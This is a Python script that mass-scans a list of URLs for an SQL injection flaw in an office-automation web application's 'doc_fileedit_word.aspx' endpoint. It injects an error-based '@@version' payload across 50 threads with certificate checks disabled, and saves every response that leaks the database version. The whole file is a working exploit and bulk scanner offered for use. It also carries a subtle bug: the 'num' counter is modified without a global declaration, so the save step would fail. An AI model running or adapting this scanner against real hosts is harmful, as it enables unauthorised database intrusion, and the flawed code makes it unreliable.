import requests
import warnings
warnings.filterwarnings("ignore")
import time
import random

num = 0
def poc(ur):
    # Target URL,
    # url = f"{url}SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+"
    url = f"{ur}dossier/doc_fileedit_word.aspx?recordid=1'%20and%201=@@version--+&edittype=1,1"
    # Headers
    time.sleep(0.5)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0'
    }

    # Sending the GET request
    try:
        response = requests.get(url, headers=headers,verify=False,timeout=5)
    except Exception as e:
        return 
    # Print the response from the server
    if "Microsoft" in response.text:
        # print(response.text)
        with open('./oa_html/oa_'+f'{num}.html','w+',encoding='utf-8') as f:
            f.write(response.text)
        num+=1
        # input("Press Enter to continue...")




    else:
        # print(url)
        pass
        # print(url)
        # print("Failed to retrieve the file.\n",response.status_code)



# with open("urls.txt", "r") as file:
#         urls = list(set(file.readlines()))
# for url in urls:
#     poc(url.strip())
from concurrent.futures import ThreadPoolExecutor
# 批量检测
with open('urls.txt', 'r') as file:
    urls = [u.strip() for u in file.readlines()][200:]
with ThreadPoolExecutor(max_workers=50) as executor:
    executor.map(poc, urls)